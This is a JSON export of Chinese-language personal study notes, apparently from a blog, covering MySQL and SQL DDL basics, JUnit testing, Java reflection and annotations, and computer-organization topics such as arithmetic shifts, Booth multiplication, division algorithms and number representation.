[{"id":"bd2363725236602d9ed430e1445ce7eb","title":"JavaWeb-数据库","content":"# 1、数据库的相关概念\n\n数据库\n数据库管理系统\nSQL\n常见的关系型数据库管理系统\n\n数据库：\n\n存储数据的仓库，数据是有组织进行存储\n英文：DataBase，简称 DB\n\n数据库管理系统：\n\n管理数据库的大型软件\n英文：DataBase Management System，简称 DBMS\n\nSQL：\n\n英文：Structured Query Language，简称 SQL，结构化查询语言\n操作关系型数据库的语言\n定义操作所有关系型数据库的统一标准\n每一种数据库的操作方式存在不一样的地方，称为 “方言”\n\n常见的关系型数据库管理系统：\n\nOracle：收费，且非常昂贵，金融银行使用 Oracle 的居多\nMySQL：开源的免费的中小型数据库，在互联网公司使用的非常多\nSQL Server：微软的收费数据库，在 Java 中使用的不多\nPostgreSQL：开源中小型数据库\nDB2：IBM 公司的大型收费数据库产品\nSQLite：嵌入式的微型数据库，如：作为 Android 内置数据库\nMariaDB：开源免费中小型数据库\n\n\n\n\n\n\n\n\n\n\n本次只学习 MySQL，对于后续的其他数据库，都是使用 SQL 操作的，而且 SQL 可以操作市面上所有的关系型数据库\n# 2、MySQL 数据库\n\nMySQL 安装\nMySQL 卸载\nMySQL 配置\nMySQL 登录、退出\n\n安装、登录、卸载、配置等参见安装手册\n\nMySQL 数据模型\n\nMySQL 数据库模型：\n\n关系型数据库\n\n关系型数据库是建立在关系模型基础上的数据库，简单说，关系型数据库是由多张能够相互连接的二维表组成的数据库\n优点：\n\n都是使用表结构，格式一致，易于维护\n使用通用的 SQL 语言操作，使用方便，可用于复杂查询\n数据存储在磁盘中，安全（存在硬盘中就是持久化存储）\n\n\n\n\n不通过表存取的就是非关系型数据库\n数据库是通过文件夹实现的，MySQL 的数据存放在 data 目录下，每个文件夹对应一个数据库\n\n# 3、SQL 通用语法\n\nSQL 语句可以以单行或多行书写，以分号结尾\n可以使用空格或制表符来提高可读性\nMySQL 数据库的 SQL 语句不区分大小写，但是关键字建议以大写来表示\n3 种注释：\n\n单行注释：– 注释内容  或 #注释内容\n多行注释：/* 注释内容 */\n\n\n\n# 4、SQL 分类\nSQL 语句根据其功能，主要分为四类：DDL、DML、DQL、DCL。 DDL：\nDDL：Data Definition Language 数据定义语言，用来定义数据库对象 (数据库，表， 字段)\nDML：Data Manipulation Language 数据操作语言，用来对数据库表中的数据进行增删改\nDQL： Data Query Language 数据查询语言，用来查询数据库中表的记录\nDCL： Data Control Language 数据控制语言，用来创建数据库用户、控制数据库的访问权限\n\n# 5、DDL：操作数据库、表\n# 5.1 操作数据库：CRUD\n\n\nC (Create)：创建\n\n\n创建数据库：create database 数据库名称；\n\n\n创建数据库，判断是否存在，不存在再创建：create database if not exists 数据库名称；\n\n\n创建数据库，并指定字符集：create database 数据库名称 character set 字符集名；\n\n\n创建一个 db4 的数据库，判断是否存在，并指定字符集为 gbk：create database if not exists db4 character set gbk;\n\n\n\n\nR (Retrieve)：查询\n\n查询所有数据库的名称：show databases;\n查询创建数据库的 SQL 语句、字符集：show create database 数据库名；\n\n\n\nU (Update)：修改\n\n修改数据库的字符集：alter database 数据库名称 character set 字符集名；\n\n\n\nD (Delete)：删除\n\n删除数据库：drop database 数据库名称；\n判断数据库是否存在，存在再删除：drop database if exists 数据库名称；\n\n\n\n使用数据库\n\n查询当前正在使用的数据库名称：select database();\n使用数据库：use 数据库名称；\n\n\n\n# 5.2 操作表：CRUD\n\n\nC (Create)：创建\n\n\n语法：create table 表名 (\n列明 1 数据类型 1,\n列名 2 数据类型 2,\n…\n列明 n 数据类型 n\n);# 注意最后一列不需要加逗号\n\n\n数据类型\n\nint：整数类型\n\nage int,\n\n\ndouble：小数类型\n\nscore double (5,2)_最多有 5 位，小数点后 2 位\n\n\ndate：日期，只包含年月日，yyyy-MM-dd\ndatetime：日期，包含年月日时分秒，yyyy-MM-dd HH:mm:ss\ntimestamp：时间戳类型，包含年月日时分秒，如果将来不给这个字段赋值或赋值为 null，则默认使用当前的系统时间来自动赋值\nvarchar：字符串\n\nname varchar (20)：姓名最大 20 个字符\n\n\n\n\n\n复制一张表，如复制一张 student 为 student1：create table student1 like student;\n\n\n创建一张学生表\n\n\nmysql> create table student(\n    -> id int,\n    -> name varchar(32),\n    -> age int,\n    -> score double(4,1),\n    -> birthday date,\n    -> insert_time timestamp\n    -> );\n\n\nR (Retrieve)：查询\n\n查询某个数据库中所有表的名称：show tables;\n查询表结构：desc 表名称；\n查询表的创建语句：show create table 表名；\n\n\n\nU (Update)：修改\n\n修改表名：alter table 表名 rename to 新表名；\n修改表的字符集：show create table 表名；alter table 表名 character set 新字符集名；\n添加一列：alter table 表名 add 列名 数据类型；\n修改列名称、类型：alter table 表名 change 旧列名 新列明 新数据类型； 或 alter table 表名 modify 列名 新数据类型；\n删除列：alter table 表名 drop 列名；\n\n\n\nD (Delete)：删除\n\n删除表：drop table 表名；\n如果存在，再删除：drop table if exists 表名；\n\n\n\n\n","slug":"JavaWeb-数据库","date":"2022-06-20T15:09:13.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"7ee1f34768cc2e04e0232a752344cda0","title":"junit、反射","content":"# 1、junit 单元测试\n# 1.1 测试分类：\n\n黑盒测试：不用具体关注里面的代码内容，只要输入 input，经过代码的执行查看 output 是否达到预期，不需要写测试代码\n白盒测试：也需要 input 和 output，但是输入了之后代码的执行，代码的逻辑、算法、严谨度、效率等都要关注，需要写测试代码\n\njunit 就是白盒测试的一种\n# 1.2 junit 的使用\n\n\n步骤\n\n定义一个测试类（测试用例）\n\n建议：\n\n测试类名：被测试类名 Test，如 CalculatorTest\n包名：xxx.xxx.xx.test，如 cn.itclass.test\n\n\n\n\n定义测试方法：可以独立运行\n\n建议：\n\n方法名：test 测试方法名，如 testAdd ()\n返回值：void\n参数列表：空参\n\n\n\n\n给这个方法加 @Test\n导入 Junit 依赖环境（点击红灯泡，添加 junit 到 classpath）—— 视频课包为 org.junit.Test，自己补全的为 org.testng.annotations.Test; ，但是能用\n\n运行成功后会显示绿色 Test passed\n使用 junit 的时候看的不是输出的结果，看的是红色还是绿色，红色表示失败，绿色表示成功\n\n\n\n\n\n判定结果\n\n红色：失败\n绿色：成功\n可以使用 Assert 对结果进行判定，如果判定结果成功就是绿色，结果与断言结果不一样是红色\n\nAssert：静态类，使用 Assert.assertEquals (期望值，真实值)\n判定结果的时候一般不进行输出\n\n\n\n\n\n可以在一个 junit 类里面定义多个方法，然后点击对应方法的绿色小箭头单独运行\n\n\npackage cn.itclass.test;\n\nimport cn.itclass.junit.caculater;\nimport org.junit.After;\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.testng.Assert;\n\n\n\npublic class CalculatorTest &#123;\n    @Before\n    public void init() &#123;\n            System.out.println(\"before\");\n    &#125;\n    /**\n     * 测试add方法\n     */\n    @Test\n    public void testAdd()&#123;\n        System.out.println(\"我被执行了\");\n        //1.创建计算器对象\n        caculater a = new caculater();\n        int sum = a.add(1, 2);\n        //2.调用add方法\n        System.out.println(sum);\n        //3.断言：我断言的结果是3，如果是一样的就是\n        Assert.assertEquals(3,sum);\n    &#125;\n\n    @After\n    public void finish() &#123;\n        System.out.println(\"结束了\");\n    &#125;\n&#125;\n\n补充\n\n@Before：\n\n修饰的方法会在测试方法之前被自动执行\n\n\n@After：\n\n修饰的方法会在测试方法执行之后被自动执行\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n注：导包的时候一定要使用 org.junit ，如果导入的是 org.testng.annotations.Test，Test 可以正常使用，Before 和 After 不能\n# 2、反射：框架设计的灵魂\n\n\n框架：半成品软件。可以在框架的基础上进行软件的开发，简化编码\n\n\n反射：将类的各个组成部分封装为其他对象，这个过程称为反射机制\n\n\njava 代码在计算机中运行的三个阶段：\n\n\nSource 源代码阶段：写完一个类之后，使用 javac 进行编译，编译后成为一个 class 字节码文件，里面分三个区域，一个存档成员变量，一个存放构造方法，一个存放成员方法\n\n\nClass 类对象阶段：类加载器 ClassLoader 将字节码文件加载到内存中，内存中会有一个 Class 类对象来描述字节码文件，这个对象中有成员变量、构造方法、成员方法，成员变量封装成 Field 对象，构造方法封装为 Constructor 对象，成员方法封装为 Method 对象，这三个对象在 Class 类对象里面组成 Class 类，由于变量可能有多个，于是使用一个数组来描述成员内容如下\n\nField [] fields\nConstructor[] cons\nMethod[] methods\n\n这些组成一个类对象，之后可以使用这些类对象进行实例化等\n\n\nRuntime 运行阶段：Person 对象 new Person ();\n\n\n\n\n好处：\n\n可以在程序运行过程中去操作这些对象。\n可以解耦，提高程序的可扩展性\n\n\n\n\n# 2.1 获取 Class 类对象的方式\n\nClass.forName (“全类名”)：是将字节码文件加载进内存，返回 Class 对象\n\n多用于配置文件，将类名可以定义在配置文件中。读取文件，加载类\n\n\n类名.class：通过类名的属性 class 来获取\n\n多用于参数的传递\n\n\n对象.getClass ()：getClass () 方法在 Object 类中定义着\n\n多用于对象的获取字节码的方式，有对象了想获取字节码文件对象\n\n\n\n\n结论：同一个字节码文件 (*.class) 在一次程序的运行过程中，只会被加载一次，不论通过哪一种方式获取的 Class 对象都是同一个\n\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\nimport cn.itclass.domain.Student;\n\npublic class ReflectDemo1 &#123;\n\n    public static void main(String[] args) throws Exception &#123;\n        //1.Class.forName(\"全类名\")\n        Class cls1 = Class.forName(\"cn.itclass.domain.Person\");\n        System.out.println(cls1);\n        //2.类名.class\n        Class cls2 = Person.class;\n        System.out.println(cls2);\n        //3.对象.getClass()\n        Person p = new Person();\n        Class cls3 = p.getClass();\n        System.out.println(cls3);\n\n        //==比较这三个对象\n        System.out.println(cls1 == cls2); //true\n        System.out.println(cls1 == cls3); //true\n\n        Class cls4 = Student.class;\n        System.out.println(cls1 == cls4); //false\n    &#125;\n&#125;\n# 2.2 Class 对象功能\n\n获取功能：\n\n获取成员变量们\n\nField [] getFields ()：获取所有 public 修饰的成员变量\nField getField (String name)：获取指定名称的 public 修饰的成员变量\nField [] getDeclaredFields ()：获取所有成员变量，不考虑访问修饰符\nField getDeclaredField (String name)：获取指定名称的成员变量，不考虑访问修饰符\n\n\n获取构造方法们\n\nConstructer&lt;?&gt;[] getConstructors ()：获取所有 public 修饰的构造方法\nConstructer&lt;T&gt; getConstructor (类 &lt;?&gt;… parameterTypes)：获取指定 public 修饰构造方法，这里要的参数是构造参数对象\nConstructer&lt;?&gt;[] getDeclaredConstructors ()：获取所有构造方法，不考虑访问修饰符\nConstructer&lt;T&gt; getDeclaredConstructor (类 &lt;?&gt;… parameterTypes)：获取指定构造方法，不考虑访问修饰符\n\n\n获取成员方法们\n\nMethod [] getMethods ()：获取所有 public 修饰的方法\nMethod getMethod ()：获取指定 public 方法，参数为方法名和参数列表\nMethod [] getDeclaredMethods ()：获取所有方法，不考虑访问修饰符\nMethod getDeclaredMethod ()：获取指定方法，不考虑访问修饰符，参数为方法名和参数列表\n\n\n获取类名\n\nString getName()\n\n\n\n\nField：成员变量\n\n操作：\n\n设置值\n\nset (Object obj, Object value)：给 obj 对象设置 value 值\n\n\n获取值\n\nget (Object obj)：获取指定对象的值，比如 get§，获取的是 p 里的这个成员变量的值\n\n\n忽略访问权限修饰符的安全检查\n\nsetAccessible (true)：暴力反射，Field 对象中的方法\n\n\n\n\n\n\nConstructor：构造方法\n\n创建对象：T newInstance (Object … initargs)\n如果使用空参数构造方法创建对象，操作可以简化：Class 对象的 newInstance\n\n\nMethod：方法\n\n执行方法：invoke (Object obj, Object… args)，参数为对象和实际参数列表\n获取方法名称：\n\nString getName：获取方法名\n\n\n\n\n获取类名\n\nClass 对象.getName; 获取的是全类名\n\n\n\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\nimport java.lang.reflect.Field;\n\n/*获取成员变量*/\npublic class ReflectDemo2 &#123;\n    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException &#123;\n        //0.获取person的class对象\n        Class&lt;Person> personClass = Person.class;\n        //1.Field[] getFields()\n        Field[] fields = personClass.getFields();\n        for (Field field:fields)&#123;\n            System.out.println(field);\n        &#125;\n\n        //2.Field getField(String name)\n        Field a = personClass.getField(\"a\");\n        System.out.println(a);\n        //获取成员变量a的值\n        Person p = new Person();\n        Object value = a.get(p);\n        System.out.println(value);\n        a.set(p,\"张三\");\n        System.out.println(p);\n        System.out.println(\"===============================\");\n\n        //3.Field[] getDeclaredFields()\n        Field[] declaredFields = personClass.getDeclaredFields();\n        for(Field field : declaredFields)&#123;\n            System.out.println(field);\n        &#125;\n\n        //4.Field getDeclaredField(String name)\n        Field d = personClass.getDeclaredField(\"d\");\n        //忽略访问权限修饰符的安全检查\n        d.setAccessible(true);//暴力反射\n        Object o = d.get(p);\n        System.out.println(o);\n    &#125;\n\n&#125;\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationTargetException;\n/*获取构造方法*/\npublic class ReflectDemo3 &#123;\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;\n        //0.获取Person的Class对象\n        Class personClass = Person.class;\n        //1.Constructer&lt;?>[] getConstructors()\n        Constructor[] constructors = personClass.getConstructors();\n        //2.Constructer\\&lt;T\\> getConstructor(类&lt;?>... parameterTypes)\n        Constructor constructor = personClass.getConstructor(String.class, int.class);\n        System.out.println(constructor);\n        //创建对象\n        Object person = constructor.newInstance(\"张三\", 23);\n        System.out.println(person);\n        Constructor constructor1 = personClass.getConstructor();\n        Object person2 = constructor1.newInstance();\n        System.out.println(person2);\n        //空参构造（已过时）\n        Object o = personClass.newInstance();\n        System.out.println(o);\n\n    &#125;\n&#125;\npackage cn.itclass.reflect;\n\nimport cn.itclass.domain.Person;\n\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class ReflectDemo4 &#123;\n    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;\n        Class&lt;Person> personClass = Person.class;\n        /**\n         获取成员方法们\n\n         1. 获取所有方法：Method[] getMethods()\n         2. 获取指定方法：Method getMethod()\n         3. Method[] getDeclaredMethods()\n         4. Method getDeclaredMethod()\n         */\n        //获取指定名称的方法\n        Method eat = personClass.getMethod(\"eat\");\n        Person p = new Person();\n        eat.invoke(p);\n\n        Method eat1 = personClass.getMethod(\"eat\", String.class);\n        eat1.invoke(p,\"hello\");\n\n        //获取所有方法\n        Method[] methods = personClass.getMethods();\n        for(Method m : methods) &#123;\n            System.out.println(m);\n            m.setAccessible(true);\n            String name = m.getName();\n            System.out.println(name);\n        &#125;\n\n        String name = personClass.getName();\n        System.out.println(name);\n    &#125;\n&#125;\n\n# 2.3 反射案例\n\n需求：写一个 &quot;框架&quot;，不能改变该类的任何代码的前提下，可以帮我们创建任意类的对象，并且可以执行任意类的方法\n\n实现：\n\n配置文件\n反射\n\n\n步骤：\n\n将需要创建的对象的全类名和需要执行的方法定义在配置文件中\n在程序中加载读取配置文件\n使用反射技术来加载类文件进内存\n创建对象\n执行方法\n\n\n\n\n\npackage cn.itclass.reflect;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\nimport java.util.Properties;\n\n/**\n * 假设的框架类\n */\npublic class ReflectTest &#123;\n    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;\n        //可以创建任意类的对象，可以执行任意方法\n\n        /**\n         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法\n         */\n//        Person p = new Person();\n//        p.eat();\n\n        //1.加载配置文件\n        //1.1创建Properties对象\n        Properties pro = new Properties();\n        //1.2加载配置文件，转换为一个集合\n        //1.2.1获取ckass目录下的配置文件\n        ClassLoader classLoader = ReflectTest.class.getClassLoader();\n        InputStream is = classLoader.getResourceAsStream(\"pro.properties\");\n        pro.load(is);\n\n        //2.获取配置文件中定义的数据\n        String className = pro.getProperty(\"className\");\n        String methodName = pro.getProperty(\"methodName\");\n\n        //3.加载该类进内存\n        Class&lt;?> cls = Class.forName(className);\n\n        //4.创建对象\n        Object o = cls.newInstance();\n\n        //5.获取方法对象\n        Method method = cls.getMethod(methodName);\n\n        //6.执行方法\n        method.invoke(o);\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n注：类加载器没学，回头补上\n# 3、注解\n\n概念：说明程序的，给计算机看的\n注释：用文字描述程序的。给程序员看的\n概念描述：\n\nJDK1.5 之后的新特性\n说明程序的\n使用注解：@注解名称\n\n\n作用分类：\n\n编写文档：通过代码里标识的注解生成文档【生成文档 doc 文档】\n代码分析：通过代码里标识的注解对代码进行分析【使用反射】—— 经常使用\n编译检查：通过代码里标识的注解让编译器能够实现基本的编译检查【Override】\n\n\n\n# 3.1 JDK 中预定义的一些注解\n\n@Override：监测点被该注解标注的方法是否是继承自父类（接口）的\n@Depreciated：该注解标注的内容已过时，\n@SuppressWarnings：压制警告 ——@SuppressWarnings (“all”)，一般传 all，写在类上\n\n# 3.2 自定义注解\n\n\n格式：\n\n元注解\npublic @interface 注解名称 {属性列表}\n\n\n\n本质：注解本质上就是一个接口，该接口默认继承 Annotation 接口\n\npublic interface MyAnno extends java.lang.annotation.Annotation{}\n\n\n\njava 反编译命令：javap java.class 文件\n\n\n属性：接口中可以定义的一成员方法\n\n\n要求：\n\n\n属性的返回值类型有下列取值，其他不行\n\n\n基本数据类型（void 不行）\n\n\nString\n\n\n枚举\n\n\n注解\n\n\n以上类型的数组\n\n\n\n\n定义了属性，在使用时需要给属性赋值\n\n\n如果定义属性时，使用 default 关键字给属性默认初始化值，则使用注解时可以不进行属性的赋值\n\n\n如果只有一个属性需要赋值，并且属性的名称是 value，则 value 可以省略，直接定义值即可\n定义：String name () default “张三”;\t使用：@MyAnno (name = “李四”);\n\n\n数组赋值时值使用大括号包裹。如果数组中只有一个值，则大括号可以省略\n\n\n\n\n\n\n\n\n元注解：用于描述注解的注解\n\n@Target：描述注解能够作用的位置\n\nElementType 取值：\n\nTYPE: 可以作用于类上\nMETHOD: 可以作用于方法上\nFIELD: 可以作用于成员变量上\n\n\n\n\n@Retention：描述注解被保留的阶段\n\n@Retention (RetentionPolicy.RUNTIME)：当前被描述的注解会保留到 class 字节码文件中并被 JVM 读取到\n\n\n@Documented：描述注解是否被抽取到 API 文档中\n@Inherited：描述注解是否被类的子类继承\n\n\n\npackage cn.itclass.annocation;\n\nimport java.lang.annotation.*;\n\n/**\n * 元注解：用于描述注解的注解\n     - @Target：描述注解能够作用的位置\n     - @Retention：描述注解被保留的阶段\n     - @Documented：描述注解是否被抽取到API文档中\n     - @Inherited：描述注解是否被子类继承\n */\n@Target(value = &#123;ElementType.TYPE,ElementType.METHOD&#125;)//表示该MyAnno3只能作用于类上\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\n@Inherited\npublic @interface MyAnno3 &#123;\n&#125;\n# 3.3 在程序中使用（解析）注解：获取注解中定义的属性值\n\n获取注解定义的位置的对象\tClass/Method/Field 对象\n获取指定的注解\n\ngetAnnotation(Class)\n这行命令执行后其实就是在内存中生成了一个该注解接口的子类实现对象\n\n\n调用注解中的抽象方法来获取配置的属性值\n\npackage cn.itclass.annocation;\n\nimport java.io.IOException;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\n/**\n * 假设的框架类\n */\n@Pro(className = \"cn.itclass.annocation.Demo1\",methodName = \"show\")\npublic class ReflectTest &#123;\n    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;\n        //可以创建任意类的对象，可以执行任意方法\n\n        /**\n         前提：不能改变该类的任何代码，可以创建任意类的对象，可以执行任意方法\n         */\n        //1.解析注解\n        //1.1获取该类的字节码文件对象\n        Class&lt;ReflectTest> reflectTestClass = ReflectTest.class;\n        //2.获取上边的注释对象\n        //其实就是在内存中生成了一个该注解接口的子类实现对象\n        Pro annotation = reflectTestClass.getAnnotation(Pro.class);\n        //3.调用注解对象中定义的抽象方法，获取返回值\n        String className = annotation.className();\n        String methodName = annotation.methodName();\n        System.out.println(className);\n        System.out.println(methodName);\n\n        //下面与reflect一样\n        Class&lt;?> aClass = Class.forName(className);\n        Object o = aClass.newInstance();\n\n        Method method = aClass.getMethod(\"show\");\n        method.invoke(o);\n    &#125;\n&#125;\npackage cn.itclass.annocation;\n\nimport java.lang.annotation.ElementType;\nimport java.lang.annotation.Retention;\nimport java.lang.annotation.RetentionPolicy;\nimport java.lang.annotation.Target;\n\n/**\n * 描述需要去执行的类名，和方法名\n */\n@Target(ElementType.TYPE)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Pro &#123;\n    String className();\n    String methodName();\n&#125;\n# 3.4 小结\n\n以后大多数时候会使用注解，而不是自定义注解\n注解给谁用？\n\n编译器\n给解析程序用\n\n\n注解不是程序的一部分，可以理解为注解就是一个标签\n\n","slug":"junit、注解、反射","date":"2022-06-19T12:28:37.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"460b9e3a35727b706e187bd7c49b4015","title":"计算机组成原理-数据的表示和运算-2","content":"# 移位运算\n\n# 算数移位\n\n\n移动小数点相当于改变每个位的位权\n移位：通过改变各个数码位和小数点的相对位置，从而改变各个数码位的位权。可以用移位运算实现乘法、除法\n\n# 原码的算数移位\n原码的算数移位：符号位保持不变，仅对数值位进行移位\n右移：高位补 0，低位舍弃，若舍弃的位等于 0，则相当于除以 2，若舍弃的位不等于 0，则会丢失精度\n\n左移：低位补 0，高位舍弃，若舍弃的位等于 0，则相当于 ×2，若舍弃的位不等于 0，则会出现严重误差\n\n原码表示的定点小数与定点整数一个效果\n# 反码的算数移位\n正数的反码移位：正数的反码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样\n负数的反码移位\n\n反码尾数部分和原码是完全相反的，\n右移：高位补 1，低位舍弃\n左移：低位补 1，高位舍弃\n\n# 补码的算数移位\n正数的补码移位：正数的补码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样\n负数的补码移位\n\n补码是从反码的基础上末位 + 1 得到的\n补码的规律为：从右往左到第一个 1 为止，后半部分与原码相同，前半部分和反码相同\n\n\n\n右移：高位补 1，低位舍弃\n左移：低位补 0，高位舍弃\n\n# 算数移位总结\n\n# 算数移位的应用举例\n\n\n# 循环移位\n在循环移位的时候整个二进制字符串是进行循环补位的\n\n循环左移\n带进位位的循环左移\n\n\n\n循环移位的操作很适合把一个数字的低字节和高字节进行调换\n# 知识点回顾\n\n# 定点数原码乘法运算\n\n手算乘法（十进制）\n\n手算乘法（二进制）\n\n考虑用及其实现：\n\n实际数字有正负，符号位如何处理？\n乘积的位数扩大一倍，如何处理？\n4 个位积都要保存下来最后统一相加？\n\n# 原码一位乘法\n符号位单独处理：符号位等于 x 的符号位异或 y 的符号位\n数值位取绝对值进行乘法计算\n\n\nMQ 存放乘数和积的低位\nX 里存放被乘数\nACC 存放乘积高位\n如果 MQ 的最低位为 1，ACC 就加上 X 中的值，如果 MQ 的最低位为 0，就不进行相加\n相加结束之后 ACC 和 MQ 整体右移一位，循环上述操作\n乘数的符号位不用参与运算\n小数点隐含在积的符号位的右边\n\n\n# 原码一位乘法（手算模拟）\n\n原码整数的乘法与小数的运算方法是一致的，注意一下小数点的位置即可\n# 定点数补码的乘法运算\n# 补码的一位乘法\n设机器字长为 5 位（含符号位，n=4），x=-0.1101, y=+0.1011，采用 Booth 算法求 x・y\n原码一位乘法\n\n进行 n 轮加法、移位\n每轮可能加 x 绝对值，可能加 0，具体要看 MQ 的最低位的值\n每次移位是 “逻辑右移”\n符号位不参与运算\n\n补码一位乘法\n\n进行 n 论加法、移位，最后再多来一次加法\n可能加 0，可能加 [x] 补，可能加 [-x] 补，根据当前 MQ 的最低位和辅助位来确定加什么\n\n辅助位 - MQ 中最低位 = 1 时，(ACC)+[X] 补\n辅助位 - MQ 中最低位 = 0 时，(ACC)+0\n辅助位 - MQ 中最低位 =-1 时，(ACC)+[-X] 补\n\n\n每次移位是 “补码的算数右移”—— 算数右移：符号位保持不动，数字右移\n符号位参与运算\n\n补码的一位乘法（手算模拟）\nMQ 需要多一位做辅助位，辅助位初始为 0，每次右移会使 MQ 的最低位顶替原本的辅助位，随之 ACC 和 X 都是双符号位\n\n# 定点数原码除法运算\n\n# 手算除法（十进制）\n\n手算除法（二进制）\n\n# 原码除法：恢复余数法\n符号位单独处理：被除数和除数的符号位异或\n数值拉取绝对值进行除法计算\n写出 x,y 的原码，y 的补码，[-y] 补\n\n\n每次上商的时候默认会商 1，然后会把 ACC 和通用寄存器的值相减后的结果再放回 ACC 中（(ACC)+[-y] 补），如果减法运算之后符号位为 1，说明此时余数小于除数，应该商 0 的，之后计算机再将上商的值改为 0，这时 ACC 的值已经放了之前的负数，要在返回原样，就要再加上除数 [y] 补，再次覆盖 ACC\n\n\n把 ACC 和 MQ 的内容全部左移一位，进行一个错位，重复上述步骤\n\n\n\n小数点默认在第一个 0 后面，余数 = 0.0111X2^{-n}，n=4\n# 原码除法：恢复余数法（手算）\n\n# 原码除法：加减交替法（不恢复余数法）\n\n\n思路：上商为 1 相减之后出现负数直接上商 0，然后逻辑左移，加 y 补\n# 定点数补码除法运算\n# 补码除法：加减交替法\n\n符号位直接参与运算，因此不用写绝对值的补码，直接写原数的补码\n采用双符号位\n被除数和除数同号，则被除数减去除数；异号则被除数加上除数\n余数和除数同号，商 1，余数左移一位减去除数\n余数和除数异号，商 0，余数左移一位加上除数\n重复 n 次\n\n\n末位商恒置为 1\n# 除法运算总结回顾\n\n# C 语言类型转换\nC 语言中的定点整数，如 int short long 都是用补码存储的\nunsigned 表示无符号整数\n\n# 数据的存储和排列\n# 大小端模式\n\n大端：将高有效字节放在低地址，适合人类阅读\n小端：将高有效字节放在高地址，适合机器处理\n# 边界对齐\n\n转换地址就逻辑左移右移即可，每次访存只能读取一个字，且不能跨行读取\n# 浮点数的表示\n\n定点数的局限性：当所需表示的数值较大时，定点数就不能正确表示\n定点数可表示的数字范围有限，但我们不能无限制地增加数据的长度\n科学计数法：+11+3.026\n\n尾数部分越短能表示的精度就越低，阶码表示对应进制的多少次方\n\n阶码反映数值的大小，尾数反映精度\n\n# 浮点数的表示\n\n\nr: 进制，E：阶码；M：尾数\n\n# 浮点数尾数的规格化\n尾数的最高位如果是 0 就没有意义，是无效值，会丧失精度\n左规：当浮点数运算的结果为非规格化时要进行规格化处理，将尾数算数左移一位，阶码减 1\n\n右规：当浮点数运算结果的尾数出现溢出（双符号位为 01 或 10,）时，将尾数算数右移一位，阶码加 1\n\n注：采用双符号位，当溢出发生时，可以挽救。更高的符号位是正确符号位\n# 规格化浮点数的特点\n\n\n# 浮点数标准 IEEE 754\n","slug":"计算机组成原理-数据的表示和运算-2","date":"2022-06-12T00:58:10.000Z","categories_index":"计算机组成原理","tags_index":"计算机组成原理,408","author_index":"cCor4ng3"},{"id":"02e7efbd219a0c25e416f110675eb1a9","title":"计算机组成原理-数据的表示和运算","content":"# 无符号整数的表示和运算\n# 无符号整数的加法\n按位相加\n# 无符号整数的减法\n\n被减数不变，减数全部按位取反，末位 + 1，减法变加法\n从最低位开始，按位相加，并往更高位进位\n\n# 带符号整数的表示和运算 - 原反补\n# 补码的加法运算\n当负数参与加法运算时，要将两个数全部取补码，符号位也参与运算，不需要单独处理\n# 补码的减法运算\n[A]补−[B]补=[A]补+[−B]补[A]_补-[B]_补=[A]_补+[-B]_补[A]补​−[B]补​=[A]补​+[−B]补​\n[B]补[B]_补[B]补​转[−B]补[-B]_补[−B]补​：全部位按位取反（包括符号位），末位加 1\n\n或者：找第一个 1，左边全部取反，右边不变\n例 1：19-19\n\nC 语言中 int 等带符号整数是用补码来表示的\n# 原 / 反 / 补码特性对比\n小题常见考点\n\n\n原码和反码的合法表示范围完全相同，都有两种方法表示真值 0；\n补码的合法表示范围比原码多一个负数，只有一种方式表示真值 0：\n\n如果有 8 个比特，原码和反码能够表示 - 127~127，补码可以表示 - 128~127\n补码中 - 128 的表示为：1,0000000；\n原码能表示的最小的值 - 127：1,1111111；\n-128 不能转为 - 127\n补码的真值 0 表示方法：0,0000000\n\n常见考点：A 和 B 进行某种运算后，是否发生溢出 —— 手算做题可以带入十进制验证是否超出合法范围\n# 移码表示\n\n移码：在补码的基础上符号位取反就是移码，移码只能用来表示整数\n移码的合法表示范围和补码相同，也只能有一种表示真值 0 的形式，[0] 移 = 10000000\n\n\n# 定点小数的表示和运算\n定点：小数点的符号固定\n\n# 定点小数反码、补码的转换\n\n# 定点小数的加 / 减运算\n\n# 定点小数与定点整数的区别\n\n定点小数在位数扩展时，拓展位置不一样，要加在右边\n定点小数带符号与不带符号的加法减法与定点整数一样\n# 奇偶校验码\n\n\n# 算术逻辑单元 ALU\n\n\n算术运算：加减乘除等\n逻辑运算：与或非异或等\n辅助功能：移位、求补等\n\n\n# 最基本的逻辑运算\n\n在一个复杂的逻辑表达式中，与运算的优先级大于或运算的优先级 —— 类比乘法和加法，先算与再算减，且与或运算也符合下面规律\n\nA (C+D) = AC + AD —— 分配率\nABC = A (BC) —— 结合律\nA + B + C = A + (B + C) —— 结合律\n\n\n本质上逻辑表达式是对电路的数学描述，简化逻辑表达式就是在简化电路设计\n# 复合逻辑\n\n与非就是先与再非，或非就是先或再非\n反演律：\n\nA 或 B 的非等于 A 的非与 B 的非\nA 与 B 的非等于 A 的非或 B 的非\n\n同或 ： 异或取反\n\n# 用门电路求偶校验位\n\n# 一位全加器\n\n# 串行加法器\n\n# 